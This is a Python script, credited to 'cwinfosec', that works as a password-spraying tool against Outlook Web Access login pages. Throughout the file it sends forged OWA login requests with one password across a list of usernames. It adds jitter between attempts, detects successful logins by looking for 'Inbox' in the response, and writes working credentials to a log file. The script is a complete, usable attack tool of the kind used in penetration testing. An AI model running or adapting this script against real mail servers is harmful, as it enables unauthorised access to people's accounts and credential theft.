#!/usr/share/env python3

"""
Import Libraries
"""

import argparse
import colorama
import os
import random
import requests
import sys
import urllib3

try:

	from colorama import Fore, Back, Style
	from time import sleep

except Exception as e:

	print(repr(e))

"""
Setup Colorama & Suppress Certificate Warning Spam
"""

colorama.init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
Banner Function
"""

def print_banner():

	print("Password Spraying Utility To Target OWA Endpoints - cwinfosec")
	print(",---.. . .,---.    ,---.                              ")
	print("|   || | ||---|    `---.,---.,---.,---.,   .,---.,---.")
	print("|   || | ||   |        ||   ||    ,---||   ||---'|    ")
	print("`---'`-'-'`   '    `---'|---'`    `---^`---|`---'`    ")
	print("                        |              `---'\n")
	print("Help: python3 owasprayer.py --help")
	return

"""
Password Spray Function
"""

def spray(ip_address, domain, username, password):

	#
	# Generate Random Hash For Header Later On
	#

	hash_id = random.getrandbits(128)

	#
	# Proxy Declaration
	#

	spray_proxies = {
		"http":"http://127.0.0.1:8080",
		"https":"http://127.0.0.1:8080"
	}

	#
	# OWA Headers
	#

	spray_headers = {
		"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language":"en-US,en;q=0.5",
		"Accept-Encoding":"gzip, deflate",
		"Content-Type":"application/x-www-form-urlencoded",
		"Origin":"https://{}".format(ip_address),
		"Connection":"close",
		"Referer":"https://{}/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2f{}%2fowa%2f".format(ip_address,ip_address)
	}

	#
	# OWA Cookies
	#

	spray_cookies = {
		"X-BackEndCookie":"S-1-5-21-1396373213-2872852198-2033860859-1164=u56Lnp2ejJqBx8nImsiancvSm8eey9LLnMad0p6anprSzMjKys+bnczPm8vMgYHNz83N0s/N0s3Lq83MxcvKxczI",
		"PrivateComputer":"true",
		"ClientId":"%032x" % hash_id,
		"RoutingKeyCookie":"v1:c9cdfa7d-70ad-49c7-b75a-5856fa89e44b@{}".format(domain),
		"PBack":"0"
	}

	#
	# POST Data / Where We Spray The User(s) & Password
	#

	spray_data = {
		"destination":"https://{}/owa/".format(ip_address),
		"flags":"4",
		"forcedownlevel":"0",
		"username":"{}@{}".format(username, domain),
		"password":"{}".format(password),
		"passwordText":"",
		"isUtf8":"1"
	}

	#
	# Make The Password Spray Request 
	#

	try:

		#
		# Start Session For Spraying
		#

		s = requests.Session()

		#
		# Do We Use Proxies?
		#
		# Yes (uncomment)
		spray_session = s.post("https://{}/owa/auth.owa".format(ip_address), headers=spray_headers, cookies=spray_cookies, data=spray_data, proxies=spray_proxies, verify=False)

		#
		# No (uncomment)
		#spray_session = s.post("https://{}/owa/auth.owa".format(ip_address), headers=spray_headers, cookies=spray_cookies, data=spray_data, verify=False)

		#
		# Did We Get A Login?
		#

		site_page = spray_session.text

		if 'Inbox' in site_page:
			print("{}: ".format(username) + Fore.GREEN + "Success!" + Style.RESET_ALL)
			if OUTFILE_FLAG_SET == 'true':
				with open('./owa_spray.log', 'a') as out_file:
					out_file.write("URL: https://{}/owa/owa.auth ".format(ip_address) + "| User: {} ".format(username) + "| Password: {} ".format(password) + "| Status: Success\n")
					out_file.close() 
		else:
			print("{}: ".format(username) + "Incorrect Username or Password" + Style.RESET_ALL)
			if OUTFILE_FLAG_SET == 'true':
				with open('./owa_spray.log', 'a') as out_file:
					out_file.write("URL: https://{}/owa/owa.auth ".format(ip_address) + "| User: {} ".format(username) + "| Password: {} ".format(password) + "| Status: Failed\n")
					out_file.close()

	except(requests.ConnectionError, requests.HTTPError, requests.Timeout) as e:
		print(Fore.RED + "[-] Fatal: " + Style.RESET_ALL + repr(e))

	return

"""
Output File Flag Function
"""

def set_outfile_flag():

	global OUTFILE_FLAG_SET
	OUTFILE_FLAG_SET = 'true'
	return

"""
Main Function - Branches Depending On Username vs. List
"""

def main(args):

	#
	# Setup Arguments
	#

	ip_address = args.ip
	domain = args.domain
	username = args.username
	password = args.password
	userlist = args.User_list
	jitter = args.jitter

	#
	# Feedback So We Know What We're Doing
	#

	print(Fore.YELLOW + "Target URL: https://{}/owa/owa.auth".format(ip_address))
	print(Fore.YELLOW + "Target Domain: {}".format(domain))
	print(Fore.YELLOW + "Jitter: {} seconds".format(jitter))

	#
	# Flag For Output File
	#
	if args.out_file:
		set_outfile_flag()

	#
	# Branch Here - Are We Using A List?
	#
	# No

	if username:
		spray(ip_address, domain, username, password)

	#
	# Yes
	#

	if userlist:

		print(Fore.YELLOW + "Users File: " + os.getcwd() + "/{}".format(userlist) + Style.RESET_ALL)

		with open('./{}'.format(userlist), 'r') as fp:
			num_lines = sum(1 for line in fp)
			print(Fore.BLUE + "Spraying : " + Style.RESET_ALL + "{}".format(num_lines) + " Users")
			fp.close()

		with open('./{}'.format(userlist), 'r') as userlist_file:

			for user_name in userlist_file:

				if user_name == '':
					break

				user_name = user_name.strip('\n')
				spray(ip_address, domain, user_name, password)
				sleep(int(jitter))

	return

"""
Script Initialization
"""

if __name__ in "__main__":

	if len(sys.argv) <= 1:

		print_banner()
		sys.exit()

	parser = argparse.ArgumentParser(add_help=False, description='Usage: python3 owasprayer.py -i <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD>')
	parser.add_argument('-i', '--ip', action='store', type=str, help='IP Address To Target', required=True)
	parser.add_argument('-d', '--domain', action='store', type=str, help='Domain of user(s) e.g. domain.local', required=True)
	parser.add_argument('-u', '--username', action='store', type=str, help='Username to target for password spraying', required=False)
	parser.add_argument('-U', '--User-list', action='store', type=str, help='Dictionary of usernames to spray against', required=False)
	parser.add_argument('-p', '--password', action='store', type=str, help='Password to spray target with', required=True)
	parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help='Show this help menu like I needed help writing it')
	parser.add_argument('-j', '--jitter', action='store', help='Use jitter between requests', default=0)
	parser.add_argument('-o', '--out-file', action='store', help='File to store output')
	args = parser.parse_args()

	# print(args) # For debugging argument object names

	main(args)
